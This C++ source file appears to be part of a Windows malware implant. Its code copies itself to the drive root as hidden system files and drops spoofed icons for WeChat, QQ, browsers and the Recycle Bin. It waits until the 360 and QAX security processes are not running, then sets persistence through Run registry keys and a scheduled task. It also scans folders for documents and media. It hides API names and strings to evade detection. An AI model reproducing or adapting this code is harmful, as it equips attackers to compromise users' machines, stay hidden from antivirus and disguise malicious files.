#include <string>
#include "api.h"
#include <windows.h>
#include "boothelper.h"
#include "bootstartup.h"
#include "network/NetWorkData.h"
#include <lmcons.h>
#include <io.h>
#include <lmat.h>
#include <LMErr.h>
#include "RegHelper.h"
#include <string>
#include <vector>
#include "log.h"
#include "public.h"
#include "StrHelper.h"
#include "Utils.h"

using namespace std;





char* GetLinkDocFileName(char* szDstBuf, char* szCurrentPath)
{
	char szAllFileForamt[] = { '*','.','*',0 };

	string strpath = string(szCurrentPath) + szAllFileForamt;

	WIN32_FIND_DATAA stWfd = { 0 };

	HANDLE hFind = lpFindFirstFileA((char*)strpath.c_str(), (LPWIN32_FIND_DATAA)&stWfd);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	char szLastDir[] = { '.','.',0 };
	do
	{

		if (stWfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			if (lplstrcmpiA(stWfd.cFileName, szLastDir) == 0 || lplstrcmpiA(stWfd.cFileName, ".") == 0)
			{
				continue;
			}
		}
		else
		{
			if (strstr(stWfd.cFileName, ".txt") ||
				strstr(stWfd.cFileName, ".pdf") ||
				strstr(stWfd.cFileName, ".docx") ||
				strstr(stWfd.cFileName, ".doc") ||
				strstr(stWfd.cFileName, ".xlsx") ||
				strstr(stWfd.cFileName, ".xls") ||
				strstr(stWfd.cFileName, ".png") ||
				strstr(stWfd.cFileName, ".jpg") ||
				strstr(stWfd.cFileName, ".jpeg") ||
				strstr(stWfd.cFileName, ".gif") ||
				strstr(stWfd.cFileName, ".bmp") ||
				strstr(stWfd.cFileName, ".zip") ||
				strstr(stWfd.cFileName, ".rar") ||
				strstr(stWfd.cFileName, ".avi") ||
				strstr(stWfd.cFileName, ".mp4") ||
				strstr(stWfd.cFileName, ".wmv") ||
				strstr(stWfd.cFileName, ".mp3") ||
				strstr(stWfd.cFileName, ".wav"))
			{
				lpFindClose(hFind);
				lplstrcpyA(szDstBuf, szCurrentPath);
				lplstrcatA(szDstBuf, stWfd.cFileName);
				return szDstBuf;
			}
		}
	} while (lpFindNextFileA(hFind, (LPWIN32_FIND_DATAA)&stWfd));

	lpFindClose(hFind);

	return FALSE;
}





int saveProgram()
{
	char dllfn[MAX_PATH];
	char exefn[MAX_PATH];
	char curDllName[MAX_PATH];
	char curExeName[MAX_PATH];
	int iRet = GetModuleFileNameA(0, exefn, MAX_PATH);
	GetNameFromFullName(exefn, curDllName);
	writeLog("caution:curDllName:%s\r\n", curDllName);

	iRet = GetModuleFileNameA(lpThisDll, dllfn, MAX_PATH);
	GetNameFromFullName(dllfn, curExeName);
	writeLog("caution:curExeName:%s\r\n", curExeName);

	char pDstPath[4];
	pDstPath[0] = szSysDir[0];
	pDstPath[1] = ':';
	pDstPath[2] = '\\';
	pDstPath[3] = 0;

	string dstexefn = string(pDstPath) + "Program";
	string dstdllfn = string(pDstPath) + curDllName;
	if (_access(dstexefn.c_str(), 0) == 0 && _access(dstdllfn.c_str(), 0) == 0)
	{
		return TRUE;
	}

	iRet = lpCopyFileA((char*)exefn, (char*)dstexefn.c_str(), FALSE);
	//movefile can not movefile between different disk,so use copyfile instead of movefile
	if (iRet == 0)
	{
		writeLog("lpCopyFileA %s to %s error:%u\r\n", exefn, dstexefn.c_str(), lpRtlGetLastWin32Error());
	}
	else
	{
		writeLog("lpCopyFileA %s to %s ok\r\n", dllfn, dstdllfn.c_str());
		iRet = lpSetFileAttributesA((char*)dstdllfn.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE);
	}

	return TRUE;
}


int backHome(char* pDstPath, char* szCurrentDir, char szDllName[MAX_DLL_COUNT][MAX_PATH], DWORD* iDllCnt)
{
	int iRet = 0;

	char szShowInfo[1024];

	if (*(pDstPath + lstrlenA(pDstPath) - 1) != '/' && *(pDstPath + lstrlenA(pDstPath) - 1) != '\\')
	{
		lplstrcatA(pDstPath, "\\");
	}

	if (*(szCurrentDir + lstrlenA(szCurrentDir) - 1) != '/' && *(szCurrentDir + lstrlenA(szCurrentDir) - 1) != '\\')
	{
		lplstrcatA(szCurrentDir, "\\");
	}

	char szAllFileForamt[] = { '*','.','*',0 };

	string searchpath = string(szCurrentDir) + szAllFileForamt;

	WIN32_FIND_DATAA stWfd = { 0 };
	HANDLE hFind = lpFindFirstFileA((char*)searchpath.c_str(), (LPWIN32_FIND_DATAA)&stWfd);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		lpwsprintfA(szShowInfo, "%s lpFindFirstFileA:%s error:%u\r\n", __FUNCTION__, searchpath.c_str(), lpRtlGetLastWin32Error());
		writeLog(szShowInfo);
		return FALSE;
	}

	*iDllCnt = 0;

	// 	char szdllprefix[] = { '.','d','l','l',0 };
	// 	char szexeprefix[] = { '.','e','x','e',0 };
	// 	char szcomprefix[] = { '.','c','o','m',0 };

	char szLastDir[] = { '.','.',0 };

	char buf[MAX_PATH];
	char curDllName[MAX_PATH];
	char curExeName[MAX_PATH];
	iRet = GetModuleFileNameA(lpThisDll, buf, MAX_PATH);
	GetNameFromFullName(buf, curDllName);
	writeLog("caution:curDllName:%s\r\n", curDllName);

	iRet = GetModuleFileNameA(0, buf, MAX_PATH);
	GetNameFromFullName(buf, curExeName);
	writeLog("caution:curExeName:%s\r\n", curExeName);

	do
	{
		if (stWfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			if (lplstrcmpiA(stWfd.cFileName, szLastDir) == 0 || lplstrcmpiA(stWfd.cFileName, ".") == 0)
			{
				continue;
			}
			else {
				//need to process
			}
		}
		else /*if (stWfd.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE)*/
		{

			if (lplstrcmpiA(stWfd.cFileName, curDllName) == 0 || lplstrcmpiA(stWfd.cFileName, curExeName) == 0 ||
				lplstrcmpiA(stWfd.cFileName, CONFIG_FILENAME) == 0 ||
				lplstrcmpiA(stWfd.cFileName, PARAMS_FILENAME) == 0)
			{
				writeLog("find file:%s attribute:%x to copy\r\n", stWfd.cFileName, stWfd.dwFileAttributes);

				string dstfn = string(pDstPath) + stWfd.cFileName;
				string srcfn = string(szCurrentDir) + stWfd.cFileName;
				if (_access(dstfn.c_str(), 0) == 0)
				{
					writeLog("file:%s exist\r\n", stWfd.cFileName);
					continue;
				}

				iRet = lpCopyFileA((char*)srcfn.c_str(), (char*)dstfn.c_str(), FALSE);
				//movefile can not movefile between different disk,so use copyfile instead of movefile
				if (iRet == 0)
				{
					iRet = lpRtlGetLastWin32Error();
					lpwsprintfA(szShowInfo, "lpCopyFileA %s to %s error:%u\r\n", srcfn.c_str(), dstfn.c_str(), iRet);
					writeLog(szShowInfo);
				}
				else
				{
					lpwsprintfA(szShowInfo, "lpCopyFileA %s to %s ok\r\n", srcfn.c_str(), dstfn.c_str());
					writeLog(szShowInfo);

					iRet = lpSetFileAttributesA((char*)dstfn.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE);

					lplstrcpyA(szDllName[*iDllCnt], pDstPath);
					lplstrcatA(szDllName[*iDllCnt], stWfd.cFileName);
					*iDllCnt += 1;
				}
			}
		}
	} while (lpFindNextFileA(hFind, (LPWIN32_FIND_DATAA)&stWfd));

	lpFindClose(hFind);

	return *iDllCnt;
}







//%systemroot%\system32\shell32.dll iconsext
DWORD ReleaseIcon(char* szDstPath, HMODULE lpThisDll)
{
	int iret = 0;

	char szFileName[MAX_ICON_COUNT][MAX_PATH] = { 0 };
	char szWechatIconName[] = { 'w','e','c','h','a','t','.','i','c','o',0 };
	char szQQIconName[] = { 'q','q','.','i','c','o',0 };
	char szMycomputerWin10IconName[] = { 'c','o','m','p','u','t','e','r','w','i','n','1','0','.','i','c','o',0 };
	char szMycomputerWin11IconName[] = { 'c','o','m','p','u','t','e','r','w','i','n','1','1','.','i','c','o',0 };
	char szMycomputerIconName[] = { 'c','o','m','p','u','t','e','r','.','i','c','o',0 };
	char szMycomputerXPIconName[] = { 'c','o','m','p','u','t','e','r','x','p','.','i','c','o',0 };
	char szEdgeIconName[] = { 'e','d','g','e','.','i','c','o',0 };
	char szIEIconName[] = { 'i','e','.','i','c','o',0 };
	char szRecycleWin10IconName[] = { 'r','e','c','y','c','l','e','w','i','n','1','0','.','i','c','o',0 };
	char szRecycleWin11IconName[] = { 'r','e','c','y','c','l','e','w','i','n','1','1','.','i','c','o',0 };
	char szRecycleWin7IconName[] = { 'r','e','c','y','c','l','e','w','i','n','7','.','i','c','o',0 };
	char szFireFoxIconName[] = { 'f','i','r','e','f','o','x','.','i','c','o',0 };
	char szChromeIconName[] = { 'c','h','r','o','m','e','.','i','c','o',0 };

	lstrcpyA(szFileName[0], szWechatIconName);
	lstrcpyA(szFileName[1], szQQIconName);
	lstrcpyA(szFileName[2], szMycomputerWin10IconName);
	lstrcpyA(szFileName[3], szMycomputerIconName);
	lstrcpyA(szFileName[4], szMycomputerXPIconName);
	lstrcpyA(szFileName[5], szEdgeIconName);
	lstrcpyA(szFileName[6], szIEIconName);
	lstrcpyA(szFileName[7], szRecycleWin10IconName);
	lstrcpyA(szFileName[8], szRecycleWin7IconName);
	lstrcpyA(szFileName[9], szFireFoxIconName);
	lstrcpyA(szFileName[10], szChromeIconName);

	lstrcpyA(szFileName[11], szMycomputerWin11IconName);
	lstrcpyA(szFileName[12], szRecycleWin11IconName);

	DWORD dwResourceID[MAX_ICON_COUNT] = { 0 };
	dwResourceID[0] = ICON_WECHAT;
	dwResourceID[1] = ICON_QQ;
	dwResourceID[2] = ICON_MYCOMPUTERWIN10;
	dwResourceID[3] = ICON_MYCOMPUTER;
	dwResourceID[4] = ICON_MYCOMPUTERXP;
	dwResourceID[5] = ICON_EDGE;
	dwResourceID[6] = ICON_IE;
	dwResourceID[7] = ICON_RECYCLEWIN10;
	dwResourceID[8] = ICON_RECYCLEWIN7;
	dwResourceID[9] = ICON_FIREFOX;
	dwResourceID[10] = ICON_CHROME;

	dwResourceID[11] = ICON_MYCOMPUTERWIN11;
	dwResourceID[12] = ICON_RECYCLEWIN11;

	for (int i = 0; i < MAX_ICON_COUNT; i++)
	{
		if (*szFileName[i])
		{
			string dstIconPath = string(szDstPath) + szFileName[i];
			if (_access(dstIconPath.c_str(), 0) == 0)
			{
				continue;
			}

			//假设一个ico文件包含两个图标，那么你指定的图标ID对应的是在图标组RT_GROUP_ICON的资源ID，这里的数据是ico数据头，不包含图标数据，
			//但可以根据这里的数据得到它包含的两个图标在RT_ICON中的ID。所以你这个所应该使用的类型应该是RT_GROUP_ICON

			HRSRC hRes = lpFindResourceA(lpThisDll, (LPCSTR)dwResourceID[i], (LPCSTR)RT_RCDATA);
			if (hRes)
			{
				DWORD dwSize = lpSizeofResource(lpThisDll, hRes);
				HGLOBAL hGb = lpLoadResource(lpThisDll, hRes);
				if (hGb)
				{
					LPVOID pData = lpLockResource(hGb);
					if (pData)
					{
						HANDLE hFile = lpCreateFileA((char*)dstIconPath.c_str(), GENERIC_READ | GENERIC_WRITE, 0, 0, CREATE_ALWAYS,
							FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
						if (hFile != INVALID_HANDLE_VALUE)
						{
							DWORD dwCnt = 0;
							iret = lpWriteFile(hFile, (char*)pData, dwSize, &dwCnt, 0);
							lpCloseHandle(hFile);

							iret = lpSetFileAttributesA((char*)dstIconPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE);
						}
					}
				}
			}
		}
	}

	return TRUE;
}






DWORD ReleaseFile(char* szDstPath, char* filename, HMODULE lpThisDll)
{
	int iret = 0;
	char szShowInfo[1024];

	string dstFilename = string(szDstPath) + filename;

	HRSRC hRes = lpFindResourceA(lpThisDll, (LPCSTR)DLLFIRSTLOAD, (LPCSTR)RT_RCDATA);
	if (hRes)
	{
		DWORD dwSize = lpSizeofResource(lpThisDll, hRes);
		HGLOBAL hGb = lpLoadResource(lpThisDll, hRes);
		if (hGb && dwSize)
		{
			LPVOID pData = lpLockResource(hGb);
			if (pData)
			{
				HANDLE hFile = lpCreateFileA((char*)dstFilename.c_str(), GENERIC_READ | GENERIC_WRITE, 0, 0, CREATE_ALWAYS,
					FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
				if (hFile != INVALID_HANDLE_VALUE)
				{
					DWORD dwCnt = 0;
					iret = lpWriteFile(hFile, (char*)pData, dwSize, &dwCnt, 0);
					lpCloseHandle(hFile);

					iret = lpSetFileAttributesA((char*)dstFilename.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE);

					return TRUE;
				}
			}
		}
	}

	iret = lpRtlGetLastWin32Error();
	lpwsprintfA(szShowInfo, "ReleaseFile error code:%u\r\n", iret);
	writeLog(szShowInfo);

	return FALSE;
}

DWORD __stdcall snoop360snooze()
{
	char path[] = { 'S','o','f','t','w','a','r','e',0x5c,'M','i','c','r','o','s','o','f','t',0x5c,
		'W','i','n','d','o','w','s',0x5c,'C','u','r','r','e','n','t','V','e','r','s','i','o','n',0x5c,'R','u','n',0x5c,0 };

	char key[] = { 'S','y','s','t','e','m','S','e','r','v','i','c','e','A','u','t','o','R','u','n',0 };

	unsigned char value[MAX_PATH] = { 0 };

	int valuelen = MAX_PATH;

	DWORD ok = QueryRegistryValue(HKEY_CURRENT_USER, path, key, value, &valuelen);
	if (ok == 0 || strstr((char*)value, strPEResidence) == FALSE)
	{
		while (TRUE)
		{
			char sz360Tray[] = { '3','6','0','T','r','a','y','.','e','x','e',0 };

			char szQAXSafe[] = { 'Q','A','X','S','a','f','e','.','e','x','e',0 };

			bQAXSafeRunning = GetProcessIdByName(szQAXSafe);
			b360Running = GetProcessIdByName(sz360Tray);
			if (b360Running == FALSE && bQAXSafeRunning == FALSE)
			{
				writeLog("tsz is absent do what you want\r\n");

				if (iSystemVersion <= SYSTEM_VERSION_XP)
				{
					int iRet = SetBootForRegRun(HKEY_LOCAL_MACHINE, strPEResParam);

					iRet = SetBootForRegRun(HKEY_CURRENT_USER, strPEResParam);
					if (iRet == 0)
					{
						writeLog(" windows xp SetBootForRegRun error\r\n");
					}
					else
					{
						writeLog("  windows xp SetBootForRegRun ok\r\n");
					}
				}
				else
				{
					int iRet = createBootTask(SCHEDULE_RUN_MIN_INTERVAL, LITTLEBEARNAME, strPEResidence, "-s", iSystemVersion);

					iRet = SetBootForRegRun(HKEY_CURRENT_USER, strPEResParam);

					iRet = SetBootForRegRun(HKEY_LOCAL_MACHINE, strPEResParam);
				}

				saveProgram();

				writeLog("SetBootForRegRun ok\r\n");

				return TRUE;
			}
			lpSleep(HEARTBEAT_LOOP_DELAY);
		}
	}

	return FALSE;
}


int copybackCfgFiles(string srcpath, string dstpath) {

	int cnt = 0;
	if (srcpath.back() != '\\' && srcpath.back() != '/')
	{
		srcpath += "\\";
	}

	if (dstpath.back() != '\\' && dstpath.back() != '/')
	{
		dstpath += "\\";
	}

	WIN32_FIND_DATAA f = { 0 };
	int iret = 0;
	string findall = srcpath + "*.*";
	HANDLE h = lpFindFirstFileA((char*)findall.c_str(), &f);
	if (h == INVALID_HANDLE_VALUE)
	{
		return cnt;
	}

	do
	{
		if ((f.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE) && (lstrcmpiA(f.cFileName, PARAMS_FILENAME) == 0 || lstrcmpiA(f.cFileName, CONFIG_FILENAME) == 0))
		{
			string srcfn = srcpath + f.cFileName;
			string dstfn = dstpath + f.cFileName;
			iret = lpCopyFileA((char*)srcfn.c_str(), (char*)dstfn.c_str(), 0);

			cnt++;
		}
	} while (lpFindNextFileA(h, &f));

	lpFindClose(h);
	return cnt;
}